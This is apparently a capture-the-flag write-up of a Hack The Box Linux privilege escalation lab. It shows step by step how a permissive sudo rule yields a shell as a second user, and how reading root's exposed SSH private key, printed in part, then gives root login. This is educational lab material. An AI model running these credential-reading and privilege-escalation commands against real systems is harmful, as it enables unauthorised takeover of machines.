---
title: Privilege Escalation
draft: false
description: Mastering Privilege Escalation Techniques
date: 2026-08-08 00:00:00+0000
tags: ["HackTheBox", "SSH_Keys", "PrivilegeEscalation", "Easy", "HTB"]
categories: ["Easy", "HackTheBox", "HTB,SSH_Keys", "PrivilegeEscalation"]
featureimage: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSyxFVYF1Ooaih1lw4_tG3E_4bXP2l6RaR0tVexm32eVA&s=10"
---

### Introduction
Obtaining an initial foothold on a target environment rarely grants total administrative control. In penetration testing and Capture The Flag (CTF) environments, low-privileged credentials are typically just the starting point. Moving further requires systematic enumeration to uncover lateral movement opportunities and privilege escalation vectors.

This writeup covers a classic multi-stage Linux privilege escalation scenario inspired by the [Hack The Box Getting Started](https://academy.hackthebox.com/course/preview/getting-started) module. 

The attack chain consists of two primary stages:
1. **Lateral Movement (`user1` -> `user2`):** Exploiting an overly permissive `sudo` rule.
2. **Privilege Escalation (`user2` -> `root`):** Capitalizing on an exposed administrative [SSH](https://en.wikipedia.org/wiki/Secure_Shell) key..

_Disclaimer:This writeup is intended for educational and authorized security assessment purposes only. All activities were conducted within a controlled laboratory environment._

## Phase 1: Establishing the Initial Foothold.
Using the provided credentials, we establish an initial interactive shell over SSH.

```
ssh user1@<TARGET_IP> -p <TARGET_PORT>
```
Upon authenticating, we are dropped into an unprivileged environment on Ubuntu 20.04 LTS:

```
user1@target-box:~$ whoami
user1
```

A quick check of the /home directory reveals a second account on the system:

```
user1@target-box:~$ ls -la /home
drwxr-xr-x  2 user1 user1 4096 Aug  9 12:00 user1
drwxr-x---  2 user2 user2 4096 Aug  9 12:00 user2
```
Attempting to read `user2's home directory contents directly results in a standard Linux file permission error (`Permission denied). This sets our immediate objective: find a path to transition horizontally from `user1 to `user2.

## Phase 2: Auditing Sudo Privileges & Lateral Movement
To check what administrative commands our current user can run, we execute:

```
sudo -l
```
Output Analysis
```
User user1 may run the following commands on target-box:
    (user2 : user2) NOPASSWD: /bin/bash
```
This configuration presents a critical misconfiguration:

(user2 : user2): Grants user1 the ability to run the specified binary under the explicit context of user2.

NOPASSWD: Suppresses the requirement to enter user1's password upon execution.

/bin/bash: Grants access to launch an unrestricted, interactive shell binary.

Because `/bin/bash is allowed directly without restriction, we can spawn a new interactive shell session as user2:

```
sudo -u user2 /bin/bash
```
Verifying our session identity confirms successful lateral movement:

```
user2@target-box:~$ id
uid=1001(user2) gid=1001(user2) groups=1001(user2)
```
With `user2 privilege established, we can read the user flag located in `/home/user2/flag.txt.

## Phase 3: Enumerating the Root Environment
Now that we have escalated to user2, we pivot our attention toward acquiring root privileges. Standard enumeration includes inspecting administrative user directories and configuration files.

Navigating to /root demonstrates that the directory itself is listable or accessible under our current context:

```
cd /root
ls -la
Plaintext
drwxr-xr-x 3 root root 4096 Aug  9 12:00 .
drwxr-xr-x 1 root root 4096 Aug  9 12:00 ..
-rw------- 1 root root  111 Aug  9 12:00 flag.txt
drwxr-xr-x 2 root root 4096 Aug  9 12:00 .ssh
```
While `flag.txt remains unreadable due to strict standard permissions, the hidden `.ssh directory catches our attention.

## Phase 4: Exploiting Exposed SSH Key Credentials
Checking the permissions and contents of `/root/.ssh:

```
cd /root/.ssh
ls -la
```

`-rw-r--r-- 1 root root 2602 Aug  9 12:00 id_rsa
The file `id_rsa contains an OpenSSH Private Key belonging to the root account. Private keys should never be globally readable or exposed across privilege boundaries.

```
cat id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt3nX57B1Z2nSHY+aaj4lKt9lyeLVNiFh7X0vQisxoPv9BjNppQxV
PtQ8csvHq/GatgSo8oVyskZIRbWb7QvCQI7JsT+Pr4ieQayNIoDm6+i9F1hXyMc0VsAqMk
05z9YKStLma0iN6l81Mr0dAI63x0mtwRKeHvJR+EiMtUTlAX9++kQJmD9F3lDSnLF4/dEy
            <=================SNIP===================>
34b8afl+MxqFW3I5pjDrfi5zWkCypILwAAAMEAwDETdoE8mZK7wOeBFrmYjYmszaD9uCA/
m4kLJg4kHm4zHCmKUVTEb9GpEZr1hnSSVb+qn61ezSgYn3yvClGcyddIht61i7MwBt6cgl
ZGQvP/9j2jexpc1Sq0g+l7hKK/PmOrXRk4FFXk+j6l0m7z0TGXzVDiT+yCAnv6Rla/vd3e
7v0aCqLbhyFZBQ9WdyAMU/DKiZRM6knckt61TEL6ffzToNS+sQu0GSh6EYzdpUfevwKL+a
QfPM8OxSjcVJCpAAAAEXJvb3RANzZkOTFmZTVjMjcwAQ==
-----END OPENSSH PRIVATE KEY-----

```
## Phase 5: Solution/Flag
I copy the key to my local machine in a file named `id_rsa and save it,  then try to use it to log in as the root user using the commands:

```
──(papab3ar㉿kali)-[~]
└─$ ssh root@94.237.49.11 -p 31973 -i id_rsa
```
Let me break this command down in bits:
**ssh**: This is the command used to start an SSH connection.

**root@94.237.49.11**: This specifies the username and IP address of the remote server. In this case, the username is "root," and the IP address is "94.237.49.11."

**-p 31973**: This option specifies the port number to use for the SSH connection. The port number is set to "31973."

**-i id_rsa**: This option specifies the identity (private key) file to use for authentication. In this case, the private key file named "id_rsa" is being used for authentication.
of-course we gain access to the machine as the root user as we get the welcome banner like we got during our initial access with the root user's shell:
```
root@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~# 

```
So now we just list directories and read the contents of the _flag.txt_ file.
```
ls
cat flag.txt 
HTB{pr1v1l363_**********_2_r007}

```
### Conclusion
In summary, this challenge underscores the significance of privilege escalation techniques for unearthing concealed data and vulnerabilities. By leveraging SSH keys, directory permissions, and sudo privileges, we elevate our access and seize the flag.
